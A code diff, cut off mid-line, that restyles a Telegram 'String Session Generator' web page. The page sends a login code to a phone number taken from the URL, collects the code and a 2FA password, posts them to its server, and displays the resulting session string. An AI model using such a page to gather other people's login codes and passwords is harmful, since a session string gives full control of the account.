@@ -1,42 +1,149 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>String Session</title>
+  <title>String Session Generator</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body{font-family:Arial;max-width:480px;margin:2rem auto;background:#f0f2f5;padding:1rem;}
-    .card{background:#fff;padding:1.5rem;border-radius:12px;margin:1rem 0;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
-    #code{font-size:2.5rem;font-weight:bold;text-align:center;letter-spacing:0.6rem;margin:1.5rem 0;}
-    .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:0.6rem;}
-    .keypad button{font-size:1.8rem;padding:1rem;border-radius:12px;background:#e4e6eb;border:none;}
-    #msg{color:#d32f2f;text-align:center;margin:1rem 0;font-weight:bold;}
-    #result pre{background:#f1f3f4;padding:1rem;border-radius:8px;font-size:0.8rem;word-break:break-all;}
-    .copy{background:#4caf50;color:white;padding:0.8rem;border:none;border-radius:8px;font-weight:bold;}
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      max-width: 480px;
+      margin: 2rem auto;
+      background: #f4f6f9;
+      padding: 1rem;
+      color: #333;
+    }
+    .card {
+      background: #fff;
+      padding: 1.8rem;
+      border-radius: 16px;
+      margin: 1rem 0;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+    }
+    h2 {
+      margin: 0 0 0.5rem;
+      font-size: 1.5rem;
+      color: #1a73e8;
+    }
+    p {
+      margin: 0 0 1rem;
+      font-size: 0.95rem;
+      color: #555;
+    }
+    #code {
+      font-size: 2.8rem;
+      font-weight: bold;
+      text-align: center;
+      letter-spacing: 0.7rem;
+      margin: 1.8rem 0;
+      color: #222;
+    }
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 0.7rem;
+    }
+    .keypad button {
+      font-size: 1.9rem;
+      padding: 1.2rem;
+      border-radius: 14px;
+      background: #e8f0fe;
+      border: none;
+      color: #1a73e8;
+      font-weight: bold;
+      transition: 0.2s;
+    }
+    .keypad button:active {
+      background: #d0e2ff;
+      transform: scale(0.95);
+    }
+    #msg {
+      text-align: center;
+      margin: 1.2rem 0;
+      font-weight: bold;
+      min-height: 1.5rem;
+    }
+    .success { color: #0f9d58; }
+    .error { color: #d93025; }
+
+    /* 2FA & Result */
+    input[type="password"] {
+      width: 100%;
+      padding: 0.9rem;
+      margin: 0.5rem 0;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 1rem;
+    }
+    button.submit {
+      width: 100%;
+      padding: 0.9rem;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      margin-top: 0.5rem;
+    }
+
+    #result textarea {
+      width: 100%;
+      height: 130px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.85rem;
+      padding: 0.8rem;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      resize: none;
+      background: #f8f9fa;
+      margin: 0.5rem 0;
+    }
+    .copy {
+      width: 100%;
+      padding: 0.9rem;
+      background: #0f9d58;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
   </style>
 </head>
 <body>
+
   <div class="card">
     <h2>Enter 5-Digit Code</h2>
-    <p>Check your Telegram for the code.</p>
+    <p>Check your Telegram app for the login code.</p>
     <div id="code">_____</div>
     <div class="keypad">
-      <button onclick="add('1')">1</button><button onclick="add('2')">2</button><button onclick="add('3')">3</button>
-      <button onclick="add('4')">4</button><button onclick="add('5')">5</button><button onclick="add('6')">6</button>
-      <button onclick="add('7')">7</button><button onclick="add('8')">8</button><button onclick="add('9')">9</button>
-      <button onclick="add('0')">0</button><button onclick="back()">⌫</button>
+      <button onclick="add('1')">1</button>
+      <button onclick="add('2')">2</button>
+      <button onclick="add('3')">3</button>
+      <button onclick="add('4')">4</button>
+      <button onclick="add('5')">5</button>
+      <button onclick="add('6')">6</button>
+      <button onclick="add('7')">7</button>
+      <button onclick="add('8')">8</button>
+      <button onclick="add('9')">9</button>
+      <button onclick="add('0')">0</button>
+      <button onclick="back()">⌫</button>
     </div>
     <div id="msg"></div>
   </div>
 
+  <!-- 2FA Password -->
   <div id="pwd" class="card" style="display:none;">
-    <input type="password" id="pass" placeholder="2FA Password" style="width:100%;padding:0.8rem;margin:0.5rem 0;border-radius:8px;">
-    <button onclick="verify()" style="width:100%;padding:0.8rem;background:#4361ee;color:white;border:none;border-radius:8px;">Submit</button>
+    <h2>2FA Password Required</h2>
+    <input type="password" id="pass" placeholder="Enter your 2FA password">
+    <button class="submit" onclick="verify()">Submit</button>
   </div>
 
+  <!-- Result -->
   <div id="result" class="card" style="display:none;">
-    <h3>StringSession:</h3>
-    <pre id="session"></pre>
-    <button class="copy" onclick="copy()">Copy to Clipboard</button>
+    <h2>StringSession Generated!</h2>
+    <textarea id="session" readonly></textarea>
+    <button class="copy" onclick="copy()">Copy Full String</button>
   </div>
 
   <script>
@@ -44,20 +151,40 @@
     const phone = new URLSearchParams(location.search).get('phone');
     const msg = document.getElementById('msg');
 
+    // Auto send code request
     if (phone) {
       msg.innerHTML = "Sending code...";
-      fetch('/send', {method:'POST', body: new URLSearchParams({phone})})
-        .then(r => r.json())
-        .then(d => msg.innerHTML = d.ok ? "Code sent! Check Telegram." : d.error);
+      msg.className = "";
+      fetch('/send', {
+        method: 'POST',
+        body: new URLSearchParams({ phone })
+      })
+      .then(r => r.json())
+      .then(d => {
+        if (d.ok) {
+          msg.innerHTML = "Code sent! Check Telegram.";
+          msg.className = "success";
+        } else {
+          msg.innerHTML = d.error || "Failed to send code.";
+          msg.className = "error";
+        }
+      })
+      .catch(() => {
+        msg.innerHTML = "Network error.";
+        msg.className = "error";
+      });
     }
 
     function add(d) {
       if (code.length < 5) {
         code += d;
         document.getElementById('code').textContent = code.padEnd(5, '_');
-        if (code.length === 5) setTimeout(verify, 600);
+        if (code.length === 5) {
+          setTimeout(verify, 700);
+        }
       }
     }
+
     function back() {
       code = code.slice(0, -1);
       document.getElementById('code').textContent = code.padEnd(5, '_');
@@ -65,31 +192,24 @@
 
     async function verify() {
       const pwd = document.getElementById('pass')?.value || '';
-      const body = new URLSearchParams({phone, code});
+      const body = new URLSearchParams({ phone, code });
       if (pwd) body.append('pwd', pwd);
 
       msg.innerHTML = "Verifying...";
-      const r = await fetch('/verify', {method:'POST', body});
-      const d = await r.json();
+      msg.className = "";
 
-      if (d.needs_password) {
-        document.getElementById('pwd').style.display = 'block';
-        msg.innerHTML = "Enter 2FA password.";
-      } else if (d.error) {
-        msg.innerHTML = d.error;
-        code = '';
-        document.getElementById('code').textContent = '_____';
-      } else {
-        document.getElementById('session').textContent = d.session;
-        document.getElementById('result').style.display = 'block';
-        msg.innerHTML = "Success!";
-      }
-    }
+      try {
+        const r = await fetch('/verify', { method: 'POST', body });
+        const d = await r.json();
 
-    function copy() {
-      navigator.clipboard.writeText(document.getElementById('session').textContent);
-      alert("Copied!");
-    }
-  </script>
-</body>
-</html>
+        if (d.needs_password) {
+          document.getElementById('pwd').style.display = 'block';
+          msg.innerHTML = "2FA password required.";
+          msg.className = "error";
+        } else if (d.error) {
+          msg.innerHTML = d.error;
+          msg.className = "error";
+          code = '';
+          document.getElementById('code').textContent = '_____';
+        } else if (d.session) {
+          document.getElement
